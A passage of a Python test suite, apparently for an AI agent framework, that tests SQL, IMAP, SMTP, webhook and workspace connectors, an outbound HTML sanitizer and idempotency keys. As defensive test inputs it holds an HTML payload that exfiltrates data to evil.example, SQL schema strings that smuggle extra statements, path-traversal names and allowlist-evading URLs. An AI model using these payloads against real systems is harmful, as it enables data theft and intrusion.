"""The connectors on local data and other protocols, the outbound HTML filter and a stable `Idempotency-Key` per tool call."""

from __future__ import annotations

import contextlib
import hashlib
import imaplib
import json
import re
import smtplib
import sqlite3
import sys
from email.message import EmailMessage
from pathlib import Path
from typing import Any

import pytest
from langgraph.checkpoint.memory import InMemorySaver

from awa._internal.install import install_hint
from awa.agents import Agent
from awa.connectors import (
    BearerAuth,
    ConnectorSpec,
    EnvVar,
    MockTransport,
    Operation,
    Param,
    _local,
    check_connector,
    connector_tools,
    mock_response,
)
from awa.connectors._catalog import connector_context
from awa.connectors._outbound import clean_html
from awa.errors import ConfigurationError, OptionalDependencyError
from awa.testing import FakeChatModel, tool_call
from awa.tools.approval import APPROVAL_METADATA_KEY
from awa.tools.idempotency import idempotency_key, run_idempotency_key, use_tool_call

PASSWORD = "mail-password-0123456"


def by_name(tools: list[Any]) -> dict[str, Any]:
    return {tool.name: tool for tool in tools}


@pytest.fixture
def data(tmp_path: Path) -> Path:
    folder = tmp_path / "data"
    folder.mkdir()
    (folder / "orders.csv").write_text("id,total\n1,10\n2,32\n", encoding="utf-8")
    (folder / "policy.md").write_text("# Refunds\nRefunds within 30 days.", encoding="utf-8")
    with contextlib.closing(sqlite3.connect(folder / "shop.db")) as connection, connection:
        connection.execute("CREATE TABLE orders (id INTEGER, total REAL)")
        connection.executemany("INSERT INTO orders VALUES (?, ?)", [(1, 10.0), (2, 32.0)])
    return folder


# ---------------------------------------------------------------------------- workspace


def test_workspace_offers_real_file_data_and_sql_tools(data: Path) -> None:
    tools = by_name(connector_tools("workspace", env={}, config={"root": str(data)}))
    assert {
        "workspace_read_csv",
        "workspace_query",
        "workspace_search",
        "workspace_execute",
        "workspace_write_file",
    } <= set(tools)
    rows = tools["workspace_query"].invoke({"query": "SELECT sum(total) AS s FROM orders"})
    assert "42" in rows
    assert "total" in tools["workspace_read_csv"].invoke({"path": "orders.csv"})
    assert "30 days" in tools["workspace_search"].invoke({"query": "refunds"})
    for name in ("workspace_execute", "workspace_write_file", "workspace_write_csv"):
        assert tools[name].metadata[APPROVAL_METADATA_KEY] is True
    assert tools["workspace_query"].metadata["awa_connector"] == "workspace.query"
    assert APPROVAL_METADATA_KEY not in tools["workspace_query"].metadata


def test_workspace_instances_on_a_named_database(data: Path) -> None:
    (data / "other.db").write_bytes((data / "shop.db").read_bytes())
    config = {
        "use": "workspace",
        "root": str(data),
        "database": "other.db",
        "include": ["query"],
        "description": "Table orders(id, total).",
    }
    [tool] = connector_tools("orders", env={}, config=config)
    assert tool.name == "orders_query" and "orders(id, total)" in tool.description
    assert "32" in tool.invoke({"query": "SELECT max(total) FROM orders"})


def test_a_relative_database_is_found_in_the_workspace_not_the_working_directory(
    data: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    sqlite3.connect(elsewhere / "shop.db").close()
    monkeypatch.chdir(elsewhere)
    config = {"use": "workspace", "root": str(data), "database": "shop.db", "include": ["query"]}

    [tool] = connector_tools("orders", env={}, config=config)

    assert "32" in tool.invoke({"query": "SELECT max(total) FROM orders"})


def test_the_description_names_the_columns_on_the_table_tools_only(tmp_path: Path) -> None:
    (tmp_path / "purchase_orders.csv").write_text("po,amount\nPO-1,10\n", encoding="utf-8")
    config = {
        "use": "workspace",
        "root": str(tmp_path),
        "include": ["list_files", "read_csv", "query_csv"],
        "description": "Columns: purchase_orders.csv (po, amount)",
    }
    tools = {t.name: t for t in connector_tools("files", env={}, config=config)}
    assert "purchase_orders.csv (po, amount)" in tools["files_query_csv"].description
    assert "purchase_orders.csv (po, amount)" in tools["files_read_csv"].description
    assert "Columns:" not in tools["files_list_files"].description


def test_workspace_problems_are_explained(tmp_path: Path, data: Path) -> None:
    with pytest.raises(ConfigurationError, match="does not exist"):
        connector_tools("workspace", env={}, config={"root": str(tmp_path / "missing")})
    (data / "shop.db").unlink()
    names = set(by_name(connector_tools("workspace", env={}, config={"root": str(data)})))
    assert "workspace_query" not in names and "workspace_read_file" in names
    with pytest.raises(ConfigurationError, match="no SQLite database"):
        connector_tools("workspace.query", env={}, config={"root": str(data)})


def test_workspace_check(data: Path) -> None:
    result = check_connector("workspace", env={}, config={"root": str(data)})
    assert result.ok and "database shop.db with 1 table(s)" in result.message


# ---------------------------------------------------------------------------- sql


def test_sql_reads_database_urls(data: Path) -> None:
    env = {"DATABASE_URL": f"sqlite:///{(data / 'shop.db').as_posix()}"}
    tools = by_name(connector_tools("sql", env=env))
    assert set(tools) == {"sql_schema", "sql_query", "sql_execute"}
    assert "10" in tools["sql_query"].invoke({"query": "SELECT min(total) FROM orders"})
    assert tools["sql_execute"].metadata[APPROVAL_METADATA_KEY] is True
    assert check_connector("sql", env=env).ok
    with pytest.raises(ConfigurationError, match="must start with"):
        connector_tools("sql", env={"DATABASE_URL": "oracle://u:p@h/db"})
    assert not check_connector("sql", env={}).ok


class FakeCursor:
    def __init__(self, log: list[str]) -> None:
        self.log = log
        self.description = [("n",)]

    def execute(self, statement: str, parameters: Any = None) -> None:
        self.log.append(statement)

    def fetchmany(self, size: int) -> list[tuple[int]]:
        return [(1,)]

    def fetchone(self) -> tuple[int]:
        return (1,)

    @property
    def rowcount(self) -> int:
        return 1

    def close(self) -> None:
        pass

    def __enter__(self) -> FakeCursor:
        return self

    def __exit__(self, *_: Any) -> None:
        pass


class FakeDriver:
    """A DB-API module recording how it was connected and what ran."""

    def __init__(self) -> None:
        self.connects: list[dict[str, Any]] = []
        self.log: list[str] = []

    def connect(self, *args: Any, **kwargs: Any) -> Any:
        self.connects.append({**kwargs, **({"conninfo": args[0]} if args else {})})
        log = self.log

        class Connection:
            read_only = False

            def cursor(self) -> FakeCursor:
                return FakeCursor(log)

            def rollback(self) -> None:
                log.append("ROLLBACK")

            def commit(self) -> None:
                log.append("COMMIT")

            def close(self) -> None:
                pass

        return Connection()


@pytest.mark.parametrize(
    ("url", "module", "expected", "session"),
    [
        (
            "mysql://shop:p%40ss-0123@db.example.test:3307/sales?charset=latin1",
            "pymysql",
            {
                "host": "db.example.test",
                "port": 3307,
                "user": "shop",
                "password": "p@ss-0123",
                "database": "sales",
                "charset": "latin1",
                "read_timeout": 30,
                "ssl_verify_cert": True,
                "ssl_verify_identity": True,
            },
            [
                "SET SESSION TRANSACTION READ ONLY",
                "SET SESSION max_execution_time = 30000",
                "SET SESSION max_statement_time = 30",
            ],
        ),
        (
            "mssql://report:pw-0123456@sql.example.test/erp?encrypt=require",
            "pymssql",
            {
                "server": "sql.example.test",
                "port": "1433",
                "user": "report",
                "password": "pw-0123456",
                "database": "erp",
                "encryption": "require",
                "timeout": 30,
            },
            [],
        ),
    ],
)
def test_sql_mysql_and_sql_server_urls_use_their_drivers_read_only(
    monkeypatch: pytest.MonkeyPatch,
    url: str,
    module: str,
    expected: dict[str, Any],
    session: list[str],
) -> None:
    driver = FakeDriver()
    monkeypatch.setitem(sys.modules, module, driver)
    tools = by_name(
        connector_tools("sql", env={"DATABASE_URL": url}, config={"accept_text_check": True})
    )
    answer = tools["sql_query"].invoke({"query": "SELECT 1 AS n"})
    assert answer.startswith("<tool_output") and '\\"returned\\": 1' in answer
    assert expected.items() <= driver.connects[0].items()
    assert driver.log == [*session, "SELECT 1 AS n", "ROLLBACK"]
    refused = tools["sql_query"].invoke({"query": "DELETE FROM orders"})
    assert "only SELECT or WITH" in refused and len(driver.connects) == 1
    driver.log.clear()
    gated = tools["sql_execute"]
    assert gated.metadata[APPROVAL_METADATA_KEY] is True
    ungated = by_name(
        connector_tools(
            "sql",
            env={"DATABASE_URL": url},
            config={"requires_approval": False, "accept_text_check": True},
        )
    )
    ungated["sql_execute"].invoke({"statement": "UPDATE orders SET total = 1"})
    assert driver.log == ["UPDATE orders SET total = 1", "COMMIT"]  # writes: no read-only session
    assert check_connector("sql", env={"DATABASE_URL": url}, config={"accept_text_check": True}).ok


def test_sql_server_queries_need_the_text_check_acknowledged(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setitem(sys.modules, "pymssql", FakeDriver())
    env = {"DATABASE_URL": "mssql://u:pw-0123456@h/db"}
    with pytest.raises(ConfigurationError, match="accept_text_check"):
        connector_tools("sql", env=env)
    assert "sql_execute" in by_name(
        connector_tools("sql", env=env, config={"include": ["execute"]})
    )


def test_sql_tls_defaults_to_on_for_remote_hosts_and_off_for_loopback(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    driver = FakeDriver()
    monkeypatch.setitem(sys.modules, "pymysql", driver)
    monkeypatch.setitem(sys.modules, "pymssql", driver)
    for url in (
        "mysql://u:pw-0123456@127.0.0.1/db",
        "mysql://u:pw-0123456@db.example.test/db?tls=off",
        "mssql://u:pw-0123456@localhost/db",
        "mssql://u:pw-0123456@db.example.test/db?encrypt=off",
    ):
        driver.connects.clear()
        dialect = "mysql" if url.startswith("mysql") else "mssql"
        _local.database_connector(dialect, url, read_only=True)()
        sent = driver.connects[0]
        assert not sent.get("ssl_verify_cert") and sent.get("encryption") in (None, "off")
    driver.connects.clear()
    _local.database_connector("mssql", "mssql://u:pw-0123456@db.example.test/db", read_only=True)()
    assert driver.connects[0]["encryption"] == "require"


def test_postgres_verifies_tls_for_remote_hosts(monkeypatch: pytest.MonkeyPatch) -> None:
    driver = FakeDriver()
    monkeypatch.setitem(sys.modules, "psycopg", driver)

    def conninfo(url: str) -> str:
        driver.connects.clear()
        _local.database_connector("postgresql", url, read_only=True)()
        return str(driver.connects[0]["conninfo"])

    assert conninfo("postgresql://u:p@db.example.test/db") == (
        "postgresql://u:p@db.example.test/db?sslmode=verify-full&sslrootcert=system"
    )
    assert conninfo("postgresql://u:p@db.example.test/db?sslmode=require") == (
        "postgresql://u:p@db.example.test/db?sslmode=require"
    )
    assert conninfo("postgresql://u:p@db.example.test/db?tls=off") == (
        "postgresql://u:p@db.example.test/db"
    )
    assert conninfo("postgresql://u:p@localhost/db") == "postgresql://u:p@localhost/db"


def test_sql_without_the_driver_names_the_extra(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setitem(sys.modules, "pymssql", None)
    with pytest.raises(
        OptionalDependencyError, match=re.escape(f"needs pymssql: {install_hint('sql')}")
    ):
        connector_tools(
            "sql", env={"DATABASE_URL": "sqlserver://u:p@h/db"}, config={"accept_text_check": True}
        )


def test_postgres_queries_run_in_read_only_transactions(monkeypatch: pytest.MonkeyPatch) -> None:
    driver = FakeDriver()
    monkeypatch.setitem(sys.modules, "psycopg", driver)
    connection = _local.database_connector("postgresql", "postgresql://u:p@h/db", read_only=True)()
    assert connection.read_only is True
    assert driver.connects[0]["options"] == "-c statement_timeout=30000"
    assert (
        _local.database_connector(
            "postgresql", "postgresql://u:p@h/db", read_only=False
        )().read_only
        is False
    )


def test_database_connection_errors_hide_the_url() -> None:
    url = "postgresql://user:db-password-0123@db.example.test/sales"

    def fail() -> Any:
        raise OSError(f"could not connect with {url}")

    with pytest.raises(Exception) as raised:
        _local._redacting(fail, url)()
    assert "db-password" not in str(raised.value) and "<DATABASE_URL>" in str(raised.value)


# ---------------------------------------------------------------------------- web


def test_web_search_works_without_a_key_or_through_a_configured_endpoint() -> None:
    from awa.toolkits import DuckDuckGoSearchProvider, JSONSearchProvider

    assert set(by_name(connector_tools("web", env={}))) == {"web_fetch_url", "web_search"}
    keyless = _local._web_search_provider(
        connector_context("web", env={}, config={"region": "de-de"})
    )
    assert isinstance(keyless, DuckDuckGoSearchProvider) and keyless.region == "de-de"
    env = {"WEB_SEARCH_URL": "https://search.example.test/q?q={query}", "WEB_SEARCH_API_KEY": "k1"}
    assert set(by_name(connector_tools("web", env=env))) == {"web_fetch_url", "web_search"}
    configured = _local._web_search_provider(connector_context("web", env=env))
    assert isinstance(configured, JSONSearchProvider)
    assert set(by_name(connector_tools("web.search", env={}))) == {"web_search"}
    assert check_connector("web", env={}, config={"include": ["fetch_url"]}).ok


# ---------------------------------------------------------------------------- smtp


class FakeSMTP:
    sent: list[EmailMessage] = []
    logins: list[tuple[str, str]] = []

    def __init__(self, host: str, port: int, timeout: float = 0) -> None:
        self.address = (host, port)

    def __enter__(self) -> FakeSMTP:
        return self

    def __exit__(self, *args: Any) -> None:
        return None

    def starttls(self, context: Any = None) -> None:
        return None

    def login(self, user: str, password: str) -> None:
        self.logins.append((user, password))

    def noop(self) -> None:
        return None

    def send_message(self, message: EmailMessage) -> None:
        self.sent.append(message)


SMTP_ENV = {
    "SMTP_HOST": "smtp.example.test",
    "SMTP_SENDER": "Desk <desk@example.test>",
    "SMTP_USERNAME": "desk",
    "SMTP_PASSWORD": PASSWORD,
}


def test_smtp_sends_from_the_configured_sender(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(smtplib, "SMTP", FakeSMTP)
    [gated] = connector_tools("smtp", env=SMTP_ENV)
    assert gated.name == "smtp_send_email" and gated.metadata[APPROVAL_METADATA_KEY] is True
    [tool] = connector_tools(
        "smtp",
        env=SMTP_ENV,
        config={"requires_approval": False, "allowed_recipients": ["example.test"]},
    )
    result = tool.invoke({"to": ["a@example.test"], "subject": "Hi", "body": "Hello"})
    assert "Sent the email" in result and PASSWORD not in result
    assert FakeSMTP.sent[-1]["From"] == "Desk <desk@example.test>"
    assert FakeSMTP.logins[-1] == ("desk", PASSWORD)
    assert "not allowed" in tool.invoke({"to": ["x@other.test"], "subject": "s", "body": "b"})
    assert check_connector("smtp", env=SMTP_ENV).ok
    with pytest.raises(ConfigurationError, match="SMTP_HOST, SMTP_SENDER"):
        connector_tools("smtp", env={})


@pytest.mark.parametrize(
    ("security", "message"),
    [("none", "without TLS"), ("tls", "security must be starttls, ssl or none")],
)
def test_the_smtp_check_never_logs_in_without_tls(
    security: str, message: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    FakeSMTP.logins.clear()
    monkeypatch.setattr(smtplib, "SMTP", FakeSMTP)

    result = check_connector("smtp", env=SMTP_ENV, config={"security": security})

    assert not result.ok and message in result.message
    assert FakeSMTP.logins == []


# ---------------------------------------------------------------------------- imap

MESSAGE = (
    b"From: Jane <jane@example.test>\r\nTo: desk@example.test\r\nSubject: Refund\r\n"
    b"Date: Mon, 1 Sep 2026 10:00:00 +0000\r\nContent-Type: text/plain\r\n\r\nPlease refund.\r\n"
)


class FakeIMAP:
    commands: list[tuple[str, ...]] = []
    capabilities: tuple[str, ...] = ("IMAP4REV1",)
    selected: list[str] = []

    def __init__(self, host: str, port: int, ssl_context: Any = None, timeout: float = 0) -> None:
        self.host = host
        self.utf8_enabled = False

    def enable(self, capability: str) -> tuple[str, list[bytes]]:
        self.utf8_enabled = capability == "UTF8=ACCEPT"
        return "OK", [b""]

    def login(self, user: str, password: str) -> tuple[str, list[bytes]]:
        if password != PASSWORD:
            raise imaplib.IMAP4.error(f"AUTHENTICATIONFAILED for {password}")
        return "OK", [b""]

    def select(self, folder: str, readonly: bool = False) -> tuple[str, list[bytes]]:
        assert readonly
        self.selected.append(folder)
        return "OK", [b"2"]

    def uid(self, command: str, *args: str) -> tuple[str, list[Any]]:
        self.commands.append((command, *args))
        if command == "SEARCH":
            return "OK", [b"3 4"]
        return "OK", [(b"4 (UID 4 BODY[] {100}", MESSAGE), b")"]

    def logout(self) -> None:
        return None


IMAP_ENV = {"IMAP_HOST": "imap.example.test", "IMAP_USERNAME": "desk", "IMAP_PASSWORD": PASSWORD}


def test_imap_searches_and_reads_without_marking_read(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(_local, "_IMAP_CLASS", FakeIMAP)
    tools = by_name(connector_tools("imap", env=IMAP_ENV))
    found = tools["imap_search_messages"].invoke(
        {"sender": "jane", "since": "2026-09-01", "unseen": True, "limit": 5}
    )
    assert '\\"uid\\": \\"4\\"' in found and "Refund" in found
    assert FakeIMAP.commands[0] == ("SEARCH", 'FROM "jane"', "SINCE 01-Sep-2026", "UNSEEN")
    assert all("PEEK" in " ".join(c) for c in FakeIMAP.commands if c[0] == "FETCH")
    message = tools["imap_read_message"].invoke({"uid": "4"})
    assert "Please refund." in message
    assert "quotes" in tools["imap_search_messages"].invoke({"subject": 'x" OR ALL'})
    denied = connector_tools("imap", env={**IMAP_ENV, "IMAP_PASSWORD": "wrong-password-987"})
    result = denied[0].invoke({})
    assert "refused" in result and "wrong-password-987" not in result


def test_imap_folders_and_search_text_beyond_ascii(monkeypatch: pytest.MonkeyPatch) -> None:
    class Modern(FakeIMAP):
        capabilities = ("IMAP4REV1", "UTF8=ACCEPT")

    for server, folder, answer in (
        (FakeIMAP, '"Entw&APw-rfe"', "only ASCII search text"),
        (Modern, '"Entw\u00fcrfe"', "Refund"),
    ):
        FakeIMAP.commands.clear()
        FakeIMAP.selected.clear()
        monkeypatch.setattr(_local, "_IMAP_CLASS", server)
        [search, _] = connector_tools("imap", env=IMAP_ENV)

        result = search.invoke({"folder": "Entw\u00fcrfe", "sender": "M\u00fcller"})

        assert FakeIMAP.selected == [folder] and answer in result
    assert FakeIMAP.commands[0] == ("SEARCH", 'FROM "M\u00fcller"')


@pytest.mark.parametrize("failure", ["wrong-password", "select-refused"])
def test_imap_closes_the_connection_when_login_or_select_fails(
    monkeypatch: pytest.MonkeyPatch, failure: str
) -> None:
    closed: list[str] = []

    class Failing(FakeIMAP):
        def select(self, folder: str, readonly: bool = False) -> tuple[str, list[bytes]]:
            return "NO", [b"no such folder"]

        def logout(self) -> None:
            closed.append(self.host)

    monkeypatch.setattr(_local, "_IMAP_CLASS", Failing)
    env = dict(IMAP_ENV)
    if failure == "wrong-password":
        env["IMAP_PASSWORD"] = "wrong-password-987"
    tools = connector_tools("imap", env=env)
    result = tools[0].invoke({})
    expected = {
        "wrong-password": "Error: the IMAP server refused: AUTHENTICATIONFAILED",
        "select-refused": "Error: cannot open the folder 'INBOX'",
    }
    assert result.startswith(expected[failure])
    assert closed == ["imap.example.test"]


def test_imap_needs_its_variables_when_the_tools_are_built() -> None:
    with pytest.raises(ConfigurationError, match="IMAP_HOST"):
        connector_tools("imap", env={})


# ---------------------------------------------------------------------------- webhook


def test_webhook_posts_are_gated_and_need_the_url() -> None:
    env = {"WEBHOOK_URL": "https://hooks.example.test/T000/secret-path-0123"}
    [tool] = connector_tools("webhook", env=env)
    assert tool.name == "webhook_post" and tool.metadata[APPROVAL_METADATA_KEY] is True
    assert "secret-path" not in tool.description
    with pytest.raises(ConfigurationError, match="WEBHOOK_URL"):
        connector_tools("webhook", env={})
    assert check_connector("webhook", env=env).ok


# ---------------------------------------------------------------------------- workspace schema


def test_workspace_creates_the_database_of_its_schema_when_it_is_missing(data: Path) -> None:
    """A designed outbox needs no template file: the database appears in its folder on first use."""

    config = {
        "use": "workspace",
        "root": str(data),
        "database": "outbox.db",
        "schema": ["CREATE TABLE outgoing_messages (recipient TEXT, body TEXT)"],
        "include": ["schema", "query", "execute"],
    }
    assert not (data / "outbox.db").exists()

    tools = by_name(connector_tools("outbox", env={}, config=config))

    assert (data / "outbox.db").is_file()
    assert "outgoing_messages" in tools["outbox_schema"].invoke({})
    with contextlib.closing(sqlite3.connect(data / "outbox.db")) as connection, connection:
        connection.execute("INSERT INTO outgoing_messages VALUES ('a', 'b')")  # a process wrote
    again = by_name(connector_tools("outbox", env={}, config=config))  # a second build
    assert "a" in again["outbox_query"].invoke({"query": "SELECT recipient FROM outgoing_messages"})


@pytest.mark.parametrize(
    ("schema", "message"),
    [
        (["DROP TABLE orders"], "CREATE TABLE statements only"),
        (["ATTACH DATABASE 'x.db' AS x"], "CREATE TABLE statements only"),
        ("CREATE TABLE t (a TEXT)", "a list of CREATE TABLE statements"),
    ],
)
def test_the_schema_option_takes_create_table_statements_only(
    data: Path, schema: object, message: str
) -> None:
    config = {"root": str(data), "database": "outbox.db", "schema": schema}

    with pytest.raises(ConfigurationError, match=message):
        connector_tools("workspace", env={}, config=config)
    assert not (data / "outbox.db").exists()


@pytest.mark.parametrize(
    "schema",
    [
        ["CREATE TABLE a (x TEXT); DROP TABLE a"],
        ["CREATE TABLE a (x TEXT); ATTACH DATABASE 'evil.db' AS e"],
        ["CREATE TABLE t AS SELECT load_extension('x')"],
        ["CREATE TABLE ../x (a)"],
    ],
)
def test_a_schema_that_does_more_than_create_a_table_leaves_no_database(
    data: Path, schema: list[str]
) -> None:
    config = {"root": str(data), "database": "outbox.db", "schema": schema}

    with pytest.raises(ConfigurationError, match="the schema option failed"):
        connector_tools("workspace", env={}, config=config)
    assert not (data / "outbox.db").exists() and not (data / "evil.db").exists()


@pytest.mark.parametrize("database", ["../escape.db", "sub/../../escape.db"])
def test_the_schema_option_creates_a_database_inside_the_workspace_folder_only(
    data: Path, database: str
) -> None:
    config = {"root": str(data), "database": database, "schema": ["CREATE TABLE a (x TEXT)"]}

    with pytest.raises(ConfigurationError, match="inside the workspace folder"):
        connector_tools("workspace", env={}, config=config)
    assert not (data.parent / "escape.db").exists()


def test_the_schema_option_without_a_database_is_refused(tmp_path: Path) -> None:
    config = {"root": str(tmp_path), "schema": ["CREATE TABLE a (x TEXT)"]}

    with pytest.raises(ConfigurationError, match="database option"):
        connector_tools("workspace", env={}, config=config)


ENV = {"DEMO_URL": "https://api.example.test", "DEMO_TOKEN": "token-value"}
SEND = Operation(
    "send",
    "Send a message.",
    method="POST",
    path="/messages",
    params=(
        Param("body", "Text.", location="body", key="body.content", required=True),
        Param("html", "HTML body.", type="boolean", location="local"),
    ),
    write=True,
    html_body=lambda args: "body" if args.get("html") else None,
)
SPEC = ConnectorSpec(
    name="demo",
    title="Demo",
    category="communication",
    summary="A demo messenger.",
    base_url="{DEMO_URL}",
    env=(EnvVar("DEMO_URL", "Address.", secret=False),),
    auth=(BearerAuth(EnvVar("DEMO_TOKEN", "Token.")),),
    operations=(SEND,),
)
ATTACK = (
    '<p>Your report <img src="https://evil.example/p.gif?d=IBAN-DE00"></p>'
    '<p><a href="https://evil.example/x?d=secret">details</a> and '
    '<a href="https://intranet.contoso.com/r/1">the record</a></p>'
    '<div style="background:url(https://evil.example/b)" onclick="steal()">x</div>'
    '<img src="cid:logo"><script>fetch("https://evil.example")</script>'
)


def _sent_body(transport: MockTransport) -> str:
    return str(json.loads(transport.requests[0].body or b"{}")["body"]["content"])


def _send(**config: Any) -> MockTransport:
    transport = MockTransport({"POST /messages": mock_response(201, json={"id": "1"})})
    [tool] = connector_tools(SPEC, env=ENV, config=config, transport=transport)
    tool.invoke({"body": ATTACK, "html": True})
    return transport


def test_html_body_remote_img_stripped() -> None:
    sent = _sent_body(_send(requires_approval=False))
    assert "evil.example" not in sent
    assert "<script" not in sent and "onclick" not in sent and "url(" not in sent
    assert '<img src="cid:logo">' in sent  # inline images stay


def test_html_link_outside_allowlist_removed() -> None:
    sent = _sent_body(_send(requires_approval=False, allowed_link_hosts=["contoso.com"]))
    assert '<a href="https://intranet.contoso.com/r/1">the record</a>' in sent
    assert "<a>details</a>" in sent  # the text stays, the target goes
    plain = _sent_body(_send(requires_approval=False))
    assert "contoso" not in plain  # no allowlist: no link target at all


def test_a_plain_body_is_sent_as_it_is() -> None:
    transport = MockTransport({"POST /messages": mock_response(201, json={"id": "1"})})
    [tool] = connector_tools(
        SPEC, env=ENV, config={"requires_approval": False}, transport=transport
    )
    tool.invoke({"body": "<img src=https://x.example/a>"})
    assert _sent_body(transport) == "<img src=https://x.example/a>"


async def _approved_run() -> tuple[dict[str, Any], MockTransport]:
    transport = MockTransport({"POST /messages": mock_response(201, json={"id": "1"})})
    tools = connector_tools(SPEC, env=ENV, config={"requires_approval": True}, transport=transport)
    agent = Agent(
        "clerk",
        model=FakeChatModel([tool_call("demo_send", {"body": ATTACK, "html": True}), "sent"]),
        tools=tools,
        checkpointer=InMemorySaver(),
    )
    paused = await agent.run("tell them", thread_id="t1")
    [request] = paused.interrupts
    payload = dict(request.get("value", request))
    await agent.resume("t1", {"action": "approve"})
    return payload, transport


async def test_approval_preview_shows_hidden_html() -> None:
    payload, _ = await _approved_run()
    review = payload["outbound"]
    assert "Your report" in review["preview"] and "evil.example" not in review["preview"]
    hidden = "\n".join(review["hidden"])
    assert "remote image https://evil.example/p.gif" in hidden
    assert "link to https://evil.example/x" in hidden
    assert "<script> element" in hidden and "onclick attribute" in hidden
    assert "IBAN" not in hidden and "secret" not in hidden  # queries are not shown


async def test_approved_body_hash_equals_sent() -> None:
    payload, transport = await _approved_run()
    sent = _sent_body(transport).encode("utf-8")
    assert hashlib.sha256(sent).hexdigest() == payload["outbound"]["sha256"]


def test_the_filter_is_deterministic_and_escapes_text() -> None:
    first, second = clean_html(ATTACK), clean_html(ATTACK)
    assert first == second
    assert clean_html("<p>a &lt;b&gt; &amp; c</p>").html == "<p>a &lt;b&gt; &amp; c</p>"
    assert clean_html('<a href="javascript:alert(1)">x</a>').html == "<a>x</a>"
    assert clean_html('<a href="mailto:a@b.example">m</a>').html.startswith('<a href="mailto:')


def test_outlook_and_teams_send_html_through_the_filter() -> None:
    from awa.connectors import _saas_microsoft_outlook as outlook
    from awa.connectors._saas_microsoft_teams import _html_text

    assert outlook._SEND.html_body is not None
    assert outlook._SEND.html_body({"html": True}) == "body"
    assert outlook._SEND.html_body({}) is None
    assert _html_text({"format": "html"}) == "text" and _html_text({"format": "text"}) is None


@pytest.mark.parametrize(
    "target",
    [
        r"https://evil.com\.contoso.com/",
        r"https://evil.com\@contoso.com/",
        "https://contoso.com@evil.com/",
        "https://user@intranet.contoso.com/",
        "https://evil.com\t.contoso.com/",
        "https://evil.com%0a.contoso.com/",
    ],
)
def test_link_tricks_never_pass_the_allowlist(target: str) -> None:
    cleaned = clean_html(f'<a href="{target}">x</a>', ["contoso.com"])
    assert cleaned.html == "<a>x</a>", target


def test_a_link_with_an_address_in_its_query_stays() -> None:
    link = "https://intranet.contoso.com/r?to=a@b.example"
    assert clean_html(f'<a href="{link}">x</a>', ["contoso.com"]).html == f'<a href="{link}">x</a>'


@pytest.mark.parametrize(
    "style",
    [
        "background-image: image-set('https://evil.example/a.png' 1x)",
        r"background: u\72l(https://evil.example/b)",
        "color: red; background: url(https://evil.example/b)",
        "list-style: url(https://evil.example/b)",
        r"color: \72 ed",
        "width: expression(alert(1))",
    ],
)
def test_style_keeps_only_allowed_declarations(style: str) -> None:
    cleaned = clean_html(f'<p style="{style}">x</p>')
    assert "evil" not in cleaned.html and "(" not in cleaned.html and "\\" not in cleaned.html
    assert cleaned.hidden


def test_plain_style_stays() -> None:
    style = "color: rgb(0, 0, 0); font-weight: bold; margin: 0 4px"
    assert clean_html(f'<p style="{style}">x</p>').html.startswith(
        '<p style="color: rgb(0, 0, 0); font-weight: bold; margin: 0 4px">'
    )


BASE = "https://api.example.test"
CREATE = Operation(
    "create_item",
    "Create an item.",
    method="POST",
    path="/items",
    params=(Param("title", "Title.", location="body", required=True),),
    idempotency_header="Idempotency-Key",
    write=True,
)
SPEC_IDEMPOTENCY_KEY = ConnectorSpec(
    name="demo",
    title="Demo",
    category="data",
    summary="A demo system.",
    base_url="{DEMO_URL}",
    env=(EnvVar("DEMO_URL", "Address.", secret=False),),
    auth=(BearerAuth(EnvVar("DEMO_TOKEN", "Token.")),),
    operations=(CREATE,),
)


async def _one_process(*call_ids: str, thread: str = "thread-1") -> list[str]:
    """A fresh process: new tools, transport, agent and run, on the same durable thread."""

    transport = MockTransport({"POST /items": mock_response(201, json={"id": "1"})})
    tools = connector_tools(
        SPEC_IDEMPOTENCY_KEY, env=ENV, config={"requires_approval": False}, transport=transport
    )
    script: list[Any] = [tool_call("demo_create_item", {"title": "x"}, id=i) for i in call_ids]
    agent = Agent(
        "clerk", model=FakeChatModel([*script, "done"]), tools=tools, checkpointer=InMemorySaver()
    )
    await agent.run("create it", thread_id=thread, metadata={"awa.tenant": "acme"})
    return [request.header("Idempotency-Key") or "" for request in transport.requests]


async def test_idempotency_key_stable_across_resume_and_crash() -> None:
    # The run that crashed and the run that resumes are different runs (other root run ids)
    # in different processes; the thread and the replayed tool call are the same.
    [before] = await _one_process("call_7")
    [after] = await _one_process("call_7")
    assert before == after
    assert before == idempotency_key(
        scope="thread-1",
        tool_call_id="call_7",
        operation="demo.create_item",
        tenant="acme",
        namespace="tools",  # the tool node of the agent graph
    )


async def test_idempotency_key_differs_per_tool_call() -> None:
    first, second = await _one_process("call_1", "call_2")
    assert first != second and len(first) == len(second) == 32
    [elsewhere] = await _one_process("call_1", thread="thread-2")
    assert elsewhere != first


def test_the_key_changes_with_every_part() -> None:
    base = {"scope": "t", "tool_call_id": "c", "operation": "o", "tenant": "a", "namespace": ""}
    keys = {idempotency_key(**base)}
    for part, other in (("scope", "t2"), ("tool_call_id", "c2"), ("operation", "o2")):
        keys.add(idempotency_key(**{**base, part: other}))
    keys.add(idempotency_key(**{**base, "tenant": None}))
    keys.add(idempotency_key(**{**base, "namespace": "child"}))
    assert len(keys) == 6
    with pytest.raises(ValueError, match="tool call id"):
        idempotency_key(scope="t", tool_call_id="", operation="o")


def test_without_a_run_or_tool_call_there_is_no_stable_key(
    caplog: pytest.LogCaptureFixture,
) -> None:
    assert run_idempotency_key("demo.create_item") is None
    with use_tool_call("call_1"):
        assert run_idempotency_key("demo.create_item") is None  # still no run
    transport = MockTransport({"POST /items": mock_response(201, json={"id": "1"})})
    [tool] = connector_tools(
        SPEC_IDEMPOTENCY_KEY, env=ENV, config={"requires_approval": False}, transport=transport
    )
    with caplog.at_level("INFO", logger="awa.connectors"):
        tool.invoke({"title": "x"})
    assert len(transport.requests[0].header("Idempotency-Key") or "") == 36  # a random uuid
    assert "random idempotency key" in caplog.text


def test_connector_tools_say_whose_rights_they_carry() -> None:
    person = ConnectorSpec(
        name="mine",
        title="Mine",
        category="data",
        summary="A system signed in as a person.",
        base_url="{DEMO_URL}",
